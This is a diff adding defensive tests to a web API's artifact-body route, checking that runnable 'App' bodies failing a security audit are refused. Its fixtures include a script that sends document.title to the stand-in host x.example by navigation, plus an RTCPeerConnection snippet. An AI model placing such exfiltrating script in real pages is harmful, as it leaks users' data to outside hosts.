@@ -236,6 +236,80 @@ describe("PATCH /api/artifacts/[id]/body", () => {
 		);
 	});
 
+	// Ruling 58 (RV-V I-2): an App's body is the document the live frame RUNS, with
+	// the writing bridge and today's data. The panel has no way to edit one, but this
+	// route takes any signed-in client's body, so it holds an App's to the same audit
+	// the generator and a restore are held to.
+	describe("an App's body (ruling 58)", () => {
+		const appFixture = { ...documentFixture, kind: "app" as const };
+		const NAVIGATING =
+			'<!doctype html><html><body><script>window.location.href = "https://x.example/" + document.title;</script></body></html>';
+
+		it("refuses a body the current audit calls a violation, writing nothing", async () => {
+			for (const html of [
+				NAVIGATING,
+				"<script>const peer = new RTCPeerConnection();</script>",
+			]) {
+				mockGetArtifact.mockResolvedValue(appFixture);
+
+				const response = await PATCH(
+					makeEvent({ body: { body: html, expectVersion: 2 } }),
+				);
+
+				expect(response.status).toBe(422);
+				await expect(response.json()).resolves.toEqual({
+					ok: false,
+					reason: "not_runnable",
+				});
+			}
+			expect(mockUpdateArtifactBody).not.toHaveBeenCalled();
+		});
+
+		it("saves a body that only has glitches, as before", async () => {
+			mockGetArtifact.mockResolvedValue(appFixture);
+			mockUpdateArtifactBody.mockResolvedValue({
+				ok: true,
+				versionId: "v1",
+				bodyHash: "h",
+				versionNumber: 3,
+			});
+
+			const response = await PATCH(
+				makeEvent({
+					body: {
+						body: "<script>confirm('Sure?');</script>",
+						expectVersion: 2,
+					},
+				}),
+			);
+
+			expect(response.status).toBe(200);
+			expect(mockUpdateArtifactBody).toHaveBeenCalledTimes(1);
+		});
+
+		it("is an App's rule alone: a Document that says window.location.href saves", async () => {
+			mockGetArtifact.mockResolvedValue(documentFixture);
+			mockSaveDocumentBody.mockResolvedValue({ ok: true, version: 3 });
+
+			const response = await PATCH(
+				makeEvent({ body: { body: NAVIGATING, expectVersion: 2 } }),
+			);
+
+			expect(response.status).toBe(200);
+			expect(mockSaveDocumentBody).toHaveBeenCalledTimes(1);
+		});
+
+		it("answers an out-of-scope App 404, not 422, so a body cannot probe an id", async () => {
+			mockGetArtifact.mockResolvedValue(null);
+
+			const response = await PATCH(
+				makeEvent({ body: { body: NAVIGATING, expectVersion: 2 } }),
+			);
+
+			expect(response.status).toBe(404);
+		});
+	});
+
 	// RV-1B, coordinator item 6: the editor's autosave cannot guard against a
 	// second tab's save without this round trip — `payload.baseHash` reaching
 	// the service call, and the NEW hash coming back so the caller has
@@ -253,6 +327,63 @@ describe("PATCH /api/artifacts/[id]/body", () => {
 
 			expect(mockSaveDocumentBody).toHaveBeenCalledWith(
 				expect.objectContaining({ summary: "Edited" }),
+			);
+		});
+
+		it("stores an Undo of several of Alfy's versions under the range it names, and a range that is not one under the newest alone", async () => {
+			mockGetArtifact.mockResolvedValue({
+				...documentFixture,
+				versionNumber: 4,
+			});
+			mockSaveDocumentBody.mockResolvedValue({ ok: true, version: 5 });
+
+			await PATCH(
+				makeEvent({
+					body: {
+						body: "Undone.",
+						expectVersion: 4,
+						summaryKind: "undid_alfy_change",
+						summaryVersion: 4,
+						summaryFromVersion: 2,
+					},
+				}),
+			);
+			expect(mockSaveDocumentBody).toHaveBeenLastCalledWith(
+				expect.objectContaining({ summary: "Undid Alfy's changes: v2 to v4" }),
+			);
+
+			// A first version that is not below the newest, or not a version at all.
+			for (const from of [4, 5, 0, -1, 1.5, "2", null]) {
+				await PATCH(
+					makeEvent({
+						body: {
+							body: "Undone.",
+							expectVersion: 4,
+							summaryKind: "undid_alfy_change",
+							summaryVersion: 4,
+							summaryFromVersion: from,
+						},
+					}),
+				);
+				expect(mockSaveDocumentBody).toHaveBeenLastCalledWith(
+					expect.objectContaining({ summary: "Undid Alfy's change: v4" }),
+				);
+			}
+
+			// And a Redo of the same run.
+			await PATCH(
+				makeEvent({
+					body: {
+						body: "Redone.",
+						expectVersion: 4,
+						summaryKind: "redid_alfy_change",
+						summaryVersion: 3,
+						summaryFromVersion: 2,
+					},
+				}),
+			);
+			expect(mockSaveDocumentBody).toHaveBeenLastCalledWith(
+				expect.objectContaining({ summary: "Redid Alfy's changes: v2 to v3" }),
 			);
 		});
 
